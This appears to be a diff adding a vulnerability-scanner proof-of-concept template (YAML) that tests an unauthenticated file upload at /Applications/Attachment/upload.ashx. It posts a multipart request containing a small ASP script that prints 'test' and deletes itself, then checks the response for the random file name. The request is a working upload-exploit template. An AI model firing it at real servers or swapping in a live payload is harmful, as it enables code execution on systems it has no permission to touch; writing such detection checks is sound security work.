@@ -1,0 +1,53 @@
+name: poc-yaml-hunan
+transport: http
+set:
+  file_name: randomLowercase(8)
+  file_boundary: randomLowercase(40)
+rules:
+  r0:
+    request:
+      read_timeout: 3
+      dial_timeout: 5
+      method: POST
+      path: /Applications/Attachment/upload.ashx
+      follow_redirects: false
+      headers:
+        Content-Type: >-
+          multipart/form-data;
+          boundary=------------------------{{file_boundary}}
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept: >-
+          text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      body: >
+        --------------------------{{file_boundary}}
+
+        Content-Disposition: form-data;
+        name="file";filename="{{file_name}}.txt"
+
+        
+        <%
+
+        response.write("test")
+
+        Server.CreateObject("Scripting.FileSystemObject").DeleteFile(Request.ServerVariables("PATH_TRANSLATED"))
+
+        %>
+
+        --------------------------{{file_boundary}}
+
+        Content-Disposition: form-data; name="_upload_guid"
+        
+
+        {{file_name}}
+
+        --------------------------{{file_boundary}}--
+    expression: response.status == 200 && response.body_string.contains(string(file_name))
+expression: r0() 
+detail:
+  author: flower
+  links:
+    - https://mp.weixin.qq.com/s/wyMzLUFG8egtum_LkRUQCA
+
+
